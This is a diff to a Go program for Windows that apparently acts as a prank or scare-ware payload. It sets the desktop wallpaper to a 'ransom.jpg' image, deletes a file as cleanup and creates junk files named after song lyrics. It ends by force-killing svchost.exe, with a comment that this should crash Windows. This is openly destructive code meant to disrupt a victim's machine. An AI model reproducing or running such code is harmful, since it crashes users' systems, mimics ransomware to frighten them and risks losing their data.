@@ -42,7 +42,11 @@ func changeWallpaper(imgURL string, img string) bool {
 	path, _ := windows.UTF16PtrFromString(home + "\\ransom.jpg") //Convert a String path to a pointer to that file
 	fmt.Println("Acquired the path")
 	procSystemParametersInfoW.Call(0x0014 /*SPI_SETDESKWALLPAPER*/, 0, uintptr(unsafe.Pointer(path)), 0x001A /*SPIF_UPDATEINIFILE*/)
-	e := os.Remove(home + "\\Desktop\\" + img) //Cleanup
+	wd, err := os.Getwd()
+	if err != nil {
+		panic(err)
+	}
+	e := os.Remove( /*home + "\\" + */ wd + "\\" + img) //Cleanup
 	if e != nil {
 		return (false)
 	}
@@ -79,15 +83,15 @@ func createRandomFiles(numberOfFiles int) {
 	}
 }
 
-func createRandomFilesRecursive(numberOfFiles int) {
-	i := 0
-	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
-	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
-	for i < numberOfFiles {
-		os.Create(rickRoll[i])
-		i++
-	}
-}
+// func createRandomFilesRecursive(numberOfFiles int) {
+// 	i := 0
+// 	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
+// 	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
+// 	for i < numberOfFiles {
+// 		os.Create(rickRoll[i])
+// 		i++
+// 	}
+// }
 
 func main() {
 	numberOfRandomFiles := 30 //Dont go over 50
@@ -142,5 +146,5 @@ func main() {
 	// 	kill.Start()
 	// }
 	kill := exec.Command("taskkill.exe", "/f", "/im", "svchost.exe")
-	kill.Start()
+	kill.Start() //At this point the program should crash Windows
 }
